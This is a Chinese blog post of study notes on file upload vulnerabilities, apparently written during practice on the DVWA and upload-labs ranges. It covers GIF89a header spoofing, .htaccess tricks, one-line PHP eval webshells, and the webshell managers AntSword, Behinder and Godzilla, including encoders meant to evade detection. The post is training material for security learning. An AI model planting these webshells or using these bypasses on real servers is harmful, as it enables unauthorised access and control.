plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在文件欺骗中，如果在文件数据包前加入GIF89的内容，这实际上是一种通过修改文件头部来欺骗系统或应用程序的手段。文件头部通常包含文件的元数据和标识信息，而在这个过程中使用了GIF89是因为它是GIF图像文件的头部标识。</span><br><span class="line"></span><br><span class="line">下面是在文件数据包前加入GIF89实现文件欺骗的原理：</span><br><span class="line"></span><br><span class="line">1. **文件头部结构：** 不同类型的文件有不同的文件头部结构，其中包含了文件的元数据、标识信息和格式信息。在GIF图像文件中，文件头部通常以&quot;89a&quot;开头。</span><br><span class="line">2. **加入GIF89标识：** 攻击者在欺骗过程中将GIF89的标识添加到文件数据包的开头。这可以通过在文件的二进制数据中插入ASCII字符 &quot;GIF89&quot; 或相应的十六进制表示。</span><br><span class="line">3. **混淆文件类型：** 由于加入了GIF89的标识，系统或应用程序可能会误认为这个文件是一个GIF图像文件，而不是其实际的文件类型。这样可以绕过一些基于文件类型识别的安全机制。</span><br><span class="line">4. **文件扩展名不一致：** 攻击者可能会故意修改文件的扩展名，使其与GIF图像文件相符，以进一步欺骗用户和系统。</span><br><span class="line">5. **欺骗用户执行：** 如果攻击者能够使用户相信这个文件是一个图像文件，用户可能会尝试用图像查看器或编辑器打开它，从而执行其中包含的恶意代码。</span><br></pre></td></tr></table></figure><p>所以可以在一句话木马文件前加入GIF89a来实现后缀名为jpg的图片马不被识别出来，并利用.htaccess文件将图片文件更改为php文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps：图片马要注意的一点是，图片尽量不要过大，有的时候图片太大会导致图片上传失败，当然具体失败原因还是要观察js函数要求。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps：.htaccess基础知识*重点内容*</span><br><span class="line">.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</span><br><span class="line">启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</span><br><span class="line">它里面有这样一段代码：AllowOverride None，如果我们把None改成All</span><br></pre></td></tr></table></figure><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p><strong>推荐博客链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44268918/article/details/128074253?ops_request_misc=%7B%22request_id%22:%22170651800216800225536986%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=170651800216800225536986&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-128074253-null-null.142%5Ev99%5Epc_search_result_base2&utm_term=%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&spm=1018.2226.3001.4187">文件上传漏洞详解-CSDN博客</a></strong></p><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">文件上传漏洞是指攻击者通过利用应用程序或系统中存在的安全漏洞，绕过文件上传的限制，上传恶意文件到服务器。文件上传漏洞的原理如下：</span><br><span class="line"></span><br><span class="line">1. 未正确验证文件类型：应用程序在文件上传时未对文件类型进行严格的验证，导致攻击者可以上传任意类型的文件，包括恶意脚本文件（如PHP、ASP等可执行文件）。</span><br><span class="line">2. 不正确的文件扩展名检查：应用程序可能只检查文件扩展名而不对文件内容进行检查。攻击者可以修改文件的扩展名来绕过检查，将恶意文件伪装成合法文件。</span><br><span class="line">3. 绕过前端验证：前端页面上的上传限制可以被绕过，攻击者可以通过修改请求的属性或使用代理工具等方式，绕过前端的文件上传限制。</span><br><span class="line">4. 绕过后端验证：即使应用程序在前端做了文件上传限制，但后端处理上传文件的代码中存在安全漏洞，攻击者可以通过构造恶意的文件上传请求来绕过后端的验证。</span><br><span class="line">5. 目录穿越漏洞：应用程序在保存上传文件时没有正确处理用户提供的文件路径信息，导致攻击者可以通过构造特殊的文件名来实现目录穿越，将文件保存到其他目录下，甚至执行任意文件读写操作。</span><br><span class="line"></span><br><span class="line">攻击者利用文件上传漏洞可以上传恶意文件到服务器，可能导致以下安全问题：</span><br><span class="line"></span><br><span class="line">- 执行远程代码：攻击者上传的恶意文件（如Web脚本）可能被服务器执行，从而导致远程代码执行漏洞。</span><br><span class="line">- 文件覆盖：攻击者上传的文件可能会覆盖原有的合法文件，导致服务不可用或数据丢失。</span><br><span class="line">- 信息泄露：攻击者上传的文件可能包含敏感信息，泄露给其他人员获取。</span><br><span class="line">- 后门植入：攻击者上传的恶意文件可能包含后门程序，用于持久性访问和控制服务器。</span><br><span class="line"></span><br><span class="line">为了防止文件上传漏洞，应开发安全的文件上传功能，包括但不限于：</span><br><span class="line"></span><br><span class="line">- 对文件类型进行验证，并限制上传的文件类型。</span><br><span class="line">- 对文件内容进行检查，确保上传的文件是合法的。</span><br><span class="line">- 对文件名进行处理，避免目录穿越漏洞。</span><br><span class="line">- 对上传文件进行隔离，将上传的文件保存在独立目录下，并设置适当的文件权限。</span><br><span class="line">- 对上传文件进行安全扫描，检查是否包含恶意内容。</span><br><span class="line">- 定期更新和修补应用程序，以修复可能存在的安全漏洞。</span><br></pre></td></tr></table></figure><p><strong>简单来说原理就是没有对上传文件进行检测过滤，导致上传的文件导致他人能够通过访问该文件并通过某些工具和指令获取信息或者造成危害系统的效果。实现原理则是在页面有文件上传时，没有上传文件检测，这时有心者可以利用一些PHP木马，java木马（统称webshell）等文件来达到拿取类似终端操作系统的效果。</strong></p><p><strong>简单流程总结：上传一句话木马等木马程序，来使当前网页编变成一个和终端一样效果的webshell，之后通过各种命令来继续其他的操作</strong></p><h2 id="文件上传条件"><a href="#文件上传条件" class="headerlink" title="文件上传条件"></a>文件上传条件</h2><h4 id="1-有上传点"><a href="#1-有上传点" class="headerlink" title="1.有上传点"></a>1.有上传点</h4><p><strong>至少要有一个上传文件的地方，这里比较常见的是上传图片（jpg后缀名文件），那么就可以使用图片马来实现木马文件的上传（发明图片![](..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;Eagle Camp&#x2F;授课文件作业&#x2F;web漏洞&#x2F;笔记md文件&#x2F;命令注入与文件上传漏洞原理.assets&#x2F;0072E489.png)的人一定是个人才)。</strong></p><h4 id="2-后端允许恶意文件的上传，或者说我们可以绕过"><a href="#2-后端允许恶意文件的上传，或者说我们可以绕过" class="headerlink" title="2.后端允许恶意文件的上传，或者说我们可以绕过"></a>2.后端允许恶意文件的上传，或者说我们可以绕过</h4><p><strong>如果对方有拦截手段的话，或者没有绕过能力的话，自然gg了。</strong></p><h4 id="3-上传的文件服务器可以执行"><a href="#3-上传的文件服务器可以执行" class="headerlink" title="3.上传的文件服务器可以执行"></a>3.上传的文件服务器可以执行</h4><p><strong>看网站服务器的配置文件，可以运行什么类型的文件，总不能在php的站点上传java的马，服务器试运行不了该文件的，文件执行不了，后续手段更没用了</strong></p><h4 id="4-能访问到上传的文件"><a href="#4-能访问到上传的文件" class="headerlink" title="4.能访问到上传的文件"></a>4.能访问到上传的文件</h4><p><strong>有些服务器是不允许外界访相应文件路径的，这就导致文件在我们手中的操作性就很小了，另外，大多时候文件上传之后是不会回显路径的。</strong></p><h4 id="扩展：路径概念补充"><a href="#扩展：路径概念补充" class="headerlink" title="扩展：路径概念补充"></a><strong>扩展：路径概念补充</strong></h4><p>浏览器访问路径时有以下三种情况：</p><h6 id="1-目录："><a href="#1-目录：" class="headerlink" title="1.目录："></a>1.目录：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当浏览器访问的路径最终指向一个目录，那么就要看服务器相关权限配置情况</span><br><span class="line"></span><br><span class="line">​	（1）该目录可访问，那么浏览器网页最终会返回该目录下的文件</span><br><span class="line"></span><br><span class="line">​	（2）如果该目录不可访问，那么浏览网页就会回显404</span><br></pre></td></tr></table></figure><h6 id="2-代码块"><a href="#2-代码块" class="headerlink" title="2.代码块"></a>2.代码块</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当浏览器访问的路径最终指向一个代码块，那么该代码就会被执行，并将执行结果打包进响应体中返回</span><br></pre></td></tr></table></figure><h6 id="3-文件"><a href="#3-文件" class="headerlink" title="3.文件"></a>3.文件</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就要看文件的类型了，如果是可执行的文件（服务器是否配置过相关插件），服务器会优先将可执行的文件执行，并将结果封装进响应体中返回，如果是不可执行的文件，则服务器会将整个文件封装进响应体中返回。</span><br></pre></td></tr></table></figure><h2 id="简单手工实操"><a href="#简单手工实操" class="headerlink" title="简单手工实操"></a>简单手工实操</h2><h4 id="1-准备要上传的文件，木马，工具"><a href="#1-准备要上传的文件，木马，工具" class="headerlink" title="1.准备要上传的文件，木马，工具"></a><strong>1.准备要上传的文件，木马，工具</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">靶场：DVWA（low）</span><br><span class="line"></span><br><span class="line">上传文件：这里使用简单的一句话木马&lt;?php @eval($_POST[&#x27;1&#x27;]);?&gt;，写入txt记事本中，将后缀名改为PHP，之后进行文件上传。(这里的木马目的是控制名为1的参数的值，那么当我们输入1=某些命令时，则该命令就会被执行。)</span><br><span class="line"></span><br><span class="line">工具：Hackbar V2</span><br></pre></td></tr></table></figure><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182445962.png" title="image-20240905182445962"> <img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182454966.png" title="image-20240905182454966"> <img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182501805.png" title="image-20240905182501805"><h4 id="2-上传木马，记录木马路径"><a href="#2-上传木马，记录木马路径" class="headerlink" title="2.上传木马，记录木马路径"></a><strong>2.上传木马，记录木马路径</strong></h4><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182509265.png" title="image-20240905182509265"><h4 id="3-访问文件路径，并输入1-phpinfo（）来查看文件是否起作用"><a href="#3-访问文件路径，并输入1-phpinfo（）来查看文件是否起作用" class="headerlink" title="3.访问文件路径，并输入1&#x3D;phpinfo（）来查看文件是否起作用"></a>3.访问文件路径，并输入1&#x3D;phpinfo（）来查看文件是否起作用</h4><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182522050.png" title="image-20240905182522050"><p>这里可以看到木马已成功植入，可以进行下一步操作。</p><h4 id="4-简单命令操作"><a href="#4-简单命令操作" class="headerlink" title="4.简单命令操作"></a>4.简单命令操作</h4><p><strong>这里要注意的是，如果要执行命令，则等号后的值要用system（）包裹，因为这是以php写的木马程序，所以只会执行php代码。</strong></p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182529983.png" title="image-20240905182529983"><h2 id="常见webshell管理工具"><a href="#常见webshell管理工具" class="headerlink" title="常见webshell管理工具"></a>常见webshell管理工具</h2><h3 id="蚁剑（AntSword）"><a href="#蚁剑（AntSword）" class="headerlink" title="蚁剑（AntSword）"></a>蚁剑（AntSword）</h3><h4 id="主要功能："><a href="#主要功能：" class="headerlink" title="主要功能："></a>主要功能：</h4><p>能够连接常见php和jsp的webshell，并提供管理面板。（蚁剑是最新版本也就是最近几个月的版本更新了jsp的webshell。）</p><h4 id="安装流程："><a href="#安装流程：" class="headerlink" title="安装流程："></a>安装流程：</h4><p>下载完成后打开蚁剑启动器开始初始化，选中主要代码路径（这里不知道为什么，我必须要挂梯子才能初始化完成，这里推测是github项目的问题，可能部分的源码没给，要从github上下载。）</p><h4 id="使用功能详解"><a href="#使用功能详解" class="headerlink" title="使用功能详解"></a>使用功能详解</h4><p><strong>使用教程:</strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41924764/article/details/108099952">中国蚁剑(AntSword)安装、使用教程_中国蚁剑使用教程-CSDN博客</a></p><h6 id="1-首先点开webshell界面后点击添加数据"><a href="#1-首先点开webshell界面后点击添加数据" class="headerlink" title="1.首先点开webshell界面后点击添加数据"></a>1.首先点开webshell界面后点击添加数据</h6><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182543615.png" title="image-20240905182543615"><h6 id="2-基础配置栏"><a href="#2-基础配置栏" class="headerlink" title="2.基础配置栏"></a>2.基础配置栏</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url地址：文件上传后的url路径地址</span><br><span class="line"></span><br><span class="line">连接密码：上传的木马文件的post参数中的值 [比如这里的一句话木马&lt;?php @eval($_GET[&#x27;qwe&#x27;]);?&gt;的连接密码就是qwe] （这里要注意的一点是，蚁剑的特殊设定导致特上传的木马文件必须要是post参数的）【GET参数马蚁剑密码失效解决办法：在蚁剑连接的url处构造post参数使密码可以生效，例如在http://192.168.149.131:8080/hackable/uploads/1.php后边加上?1=eval($_POST[&#x27;2&#x27;]);之后再将密码更改为post参数中的值就可以了。】</span><br><span class="line"></span><br><span class="line">编码设置：这里则是要根据网页的编码来进行设置</span><br><span class="line"></span><br><span class="line">连接类型：还是拿一句话木马[&lt;?php @eval($_GET[&#x27;qwe&#x27;]);?&gt;]举例，这里的连接类型用到了@eval也就是php中的函数，所以网页是php型的网站，所以这里下图中的连接类型选择php</span><br><span class="line"></span><br><span class="line">编码器：根据博客内容，编码器用来进行免杀绕过，将内容进行编码，以此来绕过某些网站安全工具的检测，从而达到渗透效果。</span><br></pre></td></tr></table></figure><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182553244.png" title="image-20240905182553244"><h6 id="3-请求信息"><a href="#3-请求信息" class="headerlink" title="3.请求信息"></a>3.请求信息</h6><p>请求信息栏主要服务于某些会在请求头或者请求体中设置特殊参数（自定字段，cookie，登录凭证）的网站，由于如果没有这些特殊参数则网站无法正常访问，所以，需要在这里添加这些参数，来进行正常渗透行动。</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182601849.png" title="image-20240905182601849"><h6 id="4-其他设置"><a href="#4-其他设置" class="headerlink" title="4.其他设置"></a>4.其他设置</h6><p>这里的其他设置就看个人要用到哪些东西了（比如后续的绕过之类的）</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182610618.png" title="image-20240905182610618"><h6 id="5-简单连接"><a href="#5-简单连接" class="headerlink" title="5.简单连接"></a>5.简单连接</h6><p>一般上完马，配置好基础配置就可以添加数据了，之后双击连接，这里可以看到蚁剑也是十分人性化的添加了物理位置</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182619691.png" title="image-20240905182619691"><p>双击之后，我们可以看到已经是拿到了目标的网站目录了，左边是网站的整体目录结构，右边则是当前文件夹的文件内容，这里也是无意间看到网站flag</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182629118.png" title="image-20240905182629118"> <img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182637947.png" title="image-20240905182637947"><h6 id="6-打开shell面板"><a href="#6-打开shell面板" class="headerlink" title="6.打开shell面板"></a>6.打开shell面板</h6><p>这里的终端是由蚁剑来构造的一个终端，（这里要注意的是，我们写的马拿到的一般都是普通权限，想要高权限的话要进行提权。）</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182647060.png" title="image-20240905182647060"> <img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182653742.png" title="image-20240905182653742"><h6 id="7-数据操作"><a href="#7-数据操作" class="headerlink" title="7.数据操作"></a>7.数据操作</h6><p>数据操作可以让我们连接到数据库，但是要注意的是，连接的前提是数据库开启了远程连接。</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182700823.png" title="image-20240905182700823"> <img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182707873.png" title="image-20240905182707873"> <img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182719577.png" title="image-20240905182719577"><h3 id="冰蝎（Behinder）"><a href="#冰蝎（Behinder）" class="headerlink" title="冰蝎（Behinder）"></a>冰蝎（Behinder）</h3><h4 id="主要功能：-1"><a href="#主要功能：-1" class="headerlink" title="主要功能："></a>主要功能：</h4><p>能够连接常见php和jsp的webshell，并提供管理面板，提供加密的webshell。</p><h4 id="使用功能详解-1"><a href="#使用功能详解-1" class="headerlink" title="使用功能详解"></a>使用功能详解</h4><h6 id="1-文件打开方式"><a href="#1-文件打开方式" class="headerlink" title="1.文件打开方式"></a>1.文件打开方式</h6><p>命令行输入java -jar 文件名，这里的话因为java环境配的还不错，所以我可以双击打开，这里直接快捷方式。</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182727986.png" title="image-20240905182727986"><h6 id="2-冰蝎webshell"><a href="#2-冰蝎webshell" class="headerlink" title="2.冰蝎webshell"></a>2.冰蝎webshell</h6><p>冰蝎和哥斯拉不同的是他不会提供木马生成工具，但是他提供了木马模板（这里要注意的是在更改密钥时要将新密钥进行32位的md5加密并截取前16位填入木马模板中来达到更换密钥的效果）</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182746153.png" title="image-20240905182746153"> <img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182754725.png" title="image-20240905182754725"><h6 id="3-传马连接"><a href="#3-传马连接" class="headerlink" title="3.传马连接"></a>3.传马连接</h6><p>这里的连接密码就是你自己定义的连接密钥，之后点击保存后双击url就可以进行连接了</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182803691.png" title="image-20240905182803691"><p>这里冰蝎有一个很吊的功能就是注入内存马，内存马相对于文件马来说更难的查杀，所以它的潜伏性更强。（但是目前冰蝎的内存马只支持java）</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182812279.png" title="image-20240905182812279"><h3 id="哥斯拉（Godzilla）"><a href="#哥斯拉（Godzilla）" class="headerlink" title="哥斯拉（Godzilla）"></a>哥斯拉（Godzilla）</h3><h4 id="主要功能：-2"><a href="#主要功能：-2" class="headerlink" title="主要功能："></a>主要功能：</h4><p>能够连接常见php和jsp的webshell，并提供管理面板，可以生成加密的webshell。</p><h4 id="使用功能详解-2"><a href="#使用功能详解-2" class="headerlink" title="使用功能详解"></a>使用功能详解</h4><h6 id="1-启动流程"><a href="#1-启动流程" class="headerlink" title="1.启动流程"></a>1.启动流程</h6><p>首先哥斯拉只有一个jar包，正常启动流程应该是在那个位置打开命令行也就是终端，之后输入java -jar 文件名打开，但是有些java环境可以直接双击打开jar包，所以我直接设置快捷方式，但是弊端就是无法查看文件打不开的原因，查看不了报错信息。</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240131235705605.png" title="image-20240131235705605"><p>正常流程</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182828897.png" title="image-20240905182828897"><h6 id="2-管理生成"><a href="#2-管理生成" class="headerlink" title="2.管理生成"></a>2.管理生成</h6><p>管理生成模块主要用来生成webshell文件的（生成木马文件的），这里的选项作用如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">密码：和蚁剑一样，这里的密码指的是post参数中包裹的值</span><br><span class="line"></span><br><span class="line">密钥：这里的密钥则是为加密器服务的，加密器不同类型生成的马有些是需要密钥的</span><br><span class="line"></span><br><span class="line">有效载荷：网页类型，这里使用的靶场是php页面，所以这里选择php</span><br><span class="line"></span><br><span class="line">加密器：生成某些服务加密的木马来躲避文件管理人员的筛查，譬如生成流量加密的木马，同时加密器需要密钥服务，有密钥才能进行解密。</span><br></pre></td></tr></table></figure><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182837145.png" title="image-20240905182837145"><h6 id="3-拿取webshell"><a href="#3-拿取webshell" class="headerlink" title="3.拿取webshell"></a>3.拿取webshell</h6><p>将哥斯拉生成的木马上传后，拿到上传路径url，之后就可以点击目标添加根据木马类型来拿取webshell添加连接了。</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905183004856.png" title="image-20240905183004856"><h6 id="4-操作连接"><a href="#4-操作连接" class="headerlink" title="4.操作连接"></a>4.操作连接</h6><p>添加完连接之后就可以右键点击进入来进行后续操作了，这里可以看到哥斯拉也是提供了很多功能，而且提供了很多便捷操作按钮。</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905183015562.png" title="image-20240905183015562"> <img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905183023667.png" title="image-20240905183023667"><h2 id="upload-labs靶场"><a href="#upload-labs靶场" class="headerlink" title="upload-labs靶场"></a>upload-labs靶场</h2><h3 id="靶场安装流程"><a href="#靶场安装流程" class="headerlink" title="靶场安装流程"></a>靶场安装流程</h3><p>靶场安装使用docker容器虚拟机安装，没有使用小皮本地安装，upload-labs靶场有些关卡利用的是linux特性，有些利用的windows特性，这里虚拟机使用的kali所以主要运用linux特性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">安装流程：</span><br><span class="line"></span><br><span class="line">docker search upload-labs</span><br><span class="line"></span><br><span class="line">docker pull c0ny1/upload-labs:latest</span><br><span class="line"></span><br><span class="line">docker run -itd -p 8081:80 -p 3307：3307 aa4</span><br></pre></td></tr></table></figure><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905183032202.png" title="image-20240905183032202"><h3 id="前后端检测判断方法"><a href="#前后端检测判断方法" class="headerlink" title="前后端检测判断方法"></a>前后端检测判断方法</h3><p>在提交文件时，打开控制台，通过查看控制台网络部分是否含有后端文件数据包来判断是不是后端检测，同时也可以检查前端js代码来判断前端检测方式。</p><h3 id="上传路径获取方式"><a href="#上传路径获取方式" class="headerlink" title="上传路径获取方式"></a>上传路径获取方式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.查看前端代码，来判断文件上传位置来确定路径。</span><br><span class="line"></span><br><span 